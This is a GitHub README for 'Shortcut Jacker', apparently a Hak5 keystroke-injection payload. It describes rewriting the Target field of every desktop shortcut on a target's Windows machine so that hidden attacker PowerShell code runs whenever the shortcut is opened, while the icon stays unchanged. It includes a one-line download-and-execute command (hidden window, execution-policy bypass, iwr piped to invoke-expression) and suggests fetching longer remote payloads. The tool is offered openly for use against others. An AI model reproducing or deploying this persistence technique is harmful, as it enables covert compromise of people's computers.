![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 

<h1 align="center">
  <a href="https://git.io/typing-svg">
    <img src="https://readme-typing-svg.herokuapp.com/?lines=Welcome+to+the;Shortcut+Jacker!+😈&center=true&size=30">
  </a>
</h1>

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Shortcut Jacker

<p align="left">
      <a href="https://www.youtube.com/watch?v=sOLIdqpzrW4">
        <img src=https://github.com/I-Am-Jakoby/hak5-submissions/raw/main/Assets/Shortcut-Jacker/SCJ-TV2.png width="300" alt="Python" />
      </a>
      <br>YouTube Tutorial	
</p>

A script used to embed malware in the shortcut on your target's desktop.

## Description

This payload will run a PowerShell script in the background of any shortcut used on the target's desktop.

This is done by taking advantage of the `Target` field where PowerShell commands can be stored or run. 

This field can store a max of 259 VISIBLE characters in that bar however after some testing I found you can store 924 characters int the `$code` variable and it will still run. 

So if your command exceeds that, consider using an IWR function to download and execute a longer script. 

I have an Invoke WebRequest tutorial for that [HERE](https://www.youtube.com/watch?v=bPkBzyEnr-w&list=PL3NRVyAumvmppdfMFMUzMug9Cn_MtF6ub&index=13)

<img src="https://github.com/I-Am-Jakoby/hak5-submissions/raw/main/Assets/Shortcut-Jacker/properties.jpg" width="300">

Inside the .ps1 file you will find a line at the beginning with a ```$code``` variable. This is where the PowerShell code you want executed is stored.

---------------------------------------------------------------------------------------------------------------------------------------------------------

<img src="https://github.com/I-Am-Jakoby/hak5-submissions/raw/main/Assets/Shortcut-Jacker/code.jpg" width="900">

---------------------------------------------------------------------------------------------------------------------------------------------------------

Using the `Get-Shortcut` function we will get the following information we can then use to maintain the integrity of the appearance of the shortcut after manipulating the `Target` field.

<img src="https://github.com/I-Am-Jakoby/hak5-submissions/raw/main/Assets/Shortcut-Jacker/shortcut.jpg" width="900">

## Getting Started

Once the script is executed, all of the shortcuts on your target's desktop will be infected with the PowerShell code you have stored in the `$code` variable in the .ps1 file

### Dependencies

* An internet connection
* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
```
powershell -w h -NoP -NonI -Exec Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

All contributors names will be listed here

I am Jakoby

<p align="right">(<a href="#top">back to top</a>)</p>

## Version History

* 0.1
    * Initial Release

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
    <td align="center" width="96">
      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>TikTok
    </td>    
  </tr>
</table>
</div>

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [MG](https://github.com/OMG-MG)

<p align="right">(<a href="#top">back to top</a>)</p>

<p align="center">
        <img src="https://raw.githubusercontent.com/bornmay/bornmay/Update/svg/Bottom.svg" alt="Github Stats" />
</p>
